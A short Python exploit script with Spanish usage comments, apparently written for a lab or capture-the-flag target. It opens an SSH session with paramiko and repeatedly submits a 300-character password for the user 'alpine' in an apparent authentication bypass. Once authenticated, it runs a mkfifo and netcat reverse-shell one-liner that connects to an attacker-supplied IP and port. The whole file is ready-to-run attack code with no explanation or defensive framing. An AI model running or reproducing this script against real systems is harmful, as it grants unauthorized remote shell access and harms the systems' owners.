#!/usr/bin/env python3
# como usar: python3 sshole.py 10.129.248.123 tu_ip 9001

import sys, time, paramiko

host  = sys.argv[1]
lhost = sys.argv[2]
lport = int(sys.argv[3]) if len(sys.argv) > 3 else 9001

pw = "A" * 300
t = paramiko.Transport((host, 22))
t.start_client(timeout=10)

for i in range(1, 7):
    try:
        t.auth_password("alpine", pw)
        print(f"[+] intento {i}: autenticado")
        break
    except paramiko.AuthenticationException:
        print(f"[-] intento {i}: denegado")

if not t.is_authenticated():
    print("[-] fallo"); sys.exit(1)

rev = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
ch = t.open_session()
ch.exec_command(rev)
time.sleep(1)
t.close()
print("[+] reverse shell enviada")
